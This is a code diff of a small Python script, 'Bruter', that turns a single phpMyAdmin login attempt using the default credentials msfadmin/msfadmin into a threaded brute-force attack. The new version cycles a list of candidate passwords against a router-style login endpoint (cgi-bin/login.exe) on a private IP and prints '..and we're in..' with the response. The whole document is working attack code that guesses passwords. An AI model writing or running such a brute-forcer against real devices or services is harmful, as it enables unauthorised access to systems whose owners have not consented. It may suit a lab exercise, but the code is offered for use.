@@ -1,20 +1,34 @@
 import urllib3
-from urllib import parse, request
+from urllib import parse, request, error
+import time
+import threading
 
 class Bruter:
 
-    postUrl = "http://192.168.2.8/phpMyAdmin/index.php?token=ff022fa5b1845dcf5dfbd84c4e3a4964"
-    usernameField = "pma_username"
-    passwordField = "pma_password"
-    usernameValue = "msfadmin"
-    passwordValue = "msfadmin"
+    baseUrl = "http://192.168.2.1/"
+    postUrl = baseUrl + "cgi-bin/login.exe"
+    # postUrl = baseUrl + "cgi-bin/logout.exe"
+    passwords = ["d41d8cd98f00b204e9800998ecf8427e", "ef21cdedfaedfad21124ceff", 312545405042, 454545454212454, 89785212477025]
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    parameters = parse.urlencode({usernameField: usernameValue, passwordField: passwordValue}).encode("utf8")
 
     def __init__(self):
-        print("Starting..")
-        _request = request.Request(self.postUrl, data=self.parameters, headers=self.headers, method="POST")
-        response = request.urlopen(_request)
-        print(_request)
+        print("[!] Starting brutal force on ")
+        for password in self.passwords:
+            time.sleep(1)
+            threading.Thread(target=self.brute, args=[password]).start()
+
+    def brute(self, password):
+        print("[>] Trying %s" % password)
+        try:
+            parameters = parse.urlencode({"pws": password}).encode("utf8")
+            request_ = request.Request(self.postUrl, data=parameters, headers=self.headers, method="POST")
+            response = request.urlopen(request_)
+            response = response.read()
+
+        except error.HTTPError as e:
+            print(str(e.code))
+            pass
+
+        print("..and we're in.. \n " + response.decode("utf8"))
 
 Bruter()
